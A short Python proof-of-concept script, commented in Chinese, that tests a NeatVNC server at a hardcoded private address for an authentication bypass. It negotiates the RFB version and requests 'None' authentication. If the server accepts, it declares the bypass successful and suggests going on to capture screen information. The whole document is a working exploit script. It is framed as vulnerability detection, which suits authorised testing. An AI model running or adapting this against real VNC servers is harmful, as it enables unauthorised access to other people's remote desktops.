# 改进版PoC - NeatVNC 认证绕过检测
import socket
import sys

target = "10.16.1.208"
port = 5900

def exploit(target, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((target, port))
        print(f"[+] 已连接到 {target}:{port}")

        # 1. 接收服务器发来的RFB版本
        server_version = s.recv(1024).decode().strip()
        print(f"[*] 服务器版本: {server_version}")

        # 2. 动态适配：同意服务器返回的版本
        s.sendall(server_version.encode())
        print(f"[*] 客户端已同意版本: {server_version}")

        # 3. 接收服务器支持的认证方式列表
        auth_count = s.recv(1)[0]
        print(f"[*] 收到 {auth_count} 种支持的认证方式")
        
        if auth_count == 0:
            print("[-] 连接失败，服务器无可用认证方式")
            return
        elif auth_count == 1:
            auth_type = s.recv(1)[0]
            print(f"[*] 服务器要求的认证方式: {auth_type:#04x}")
        else:
            auth_types = s.recv(auth_count)
            print(f"[*] 服务器支持的认证方式: {auth_types.hex()}")
            auth_type = 0x01
        
        # 4. 发送NULL认证请求
        s.sendall(bytes([auth_type]))
        print(f"[*] 客户端已选择认证方式: {auth_type:#04x} (NULL Authentication)")

        # 5. 等待认证结果
        response = s.recv(4)
        if response == b'\x00\x00\x00\x00':
            print("[!] 认证绕过成功！目标可能存在漏洞")
            print("[*] 现在可以尝试发送RFB协议进一步获取屏幕信息...")
            return True
        else:
            print(f"[-] 认证绕过失败。服务器返回: {response.hex()}")
            return False

        s.close()

    except socket.timeout:
        print("[-] 连接超时，目标可能无响应或被防火墙拦截")
    except ConnectionRefusedError:
        print("[-] 连接被拒绝，请确认端口5900是否开放")
    except Exception as e:
        print(f"[-] 发生错误: {e}")
    
    return False

if __name__ == "__main__":
    result = exploit(target, port)
    if result:
        print("\n[+] 检测完成：目标可能存在NULL认证绕过漏洞")
    else:
        print("\n[-] 检测完成：未检测到漏洞或目标已修复")